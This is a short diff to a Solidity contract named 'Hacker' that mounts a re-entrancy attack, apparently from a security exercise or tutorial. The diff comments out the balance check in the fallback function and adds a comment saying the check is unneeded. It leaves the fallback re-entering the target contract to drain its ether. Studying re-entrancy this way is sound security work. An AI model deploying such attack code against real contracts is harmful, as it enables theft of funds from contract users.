@@ -34,11 +34,14 @@ contract Hacker {
   }
 
   fallback() external payable {
+    /// @dev in practice no need to check the target's balance.
+    /// `call` will just returns false on insufficient ether, 
+    /// and the chain of transactions will be completed successfully
     // 2. Check target balance, if no more ether, stop attack
-    if (address(targetContract).balance < (0.1 ether)) {
-      emit Stop(address(targetContract), address(this).balance);
-      return;
-    }
+    // if (address(targetContract).balance < (0.1 ether)) {
+    //   emit Stop(address(targetContract), address(this).balance);
+    //   return;
+    // }
 
     // 3. Re-entrancy Attack
     emit Reenter(address(targetContract), address(this).balance);
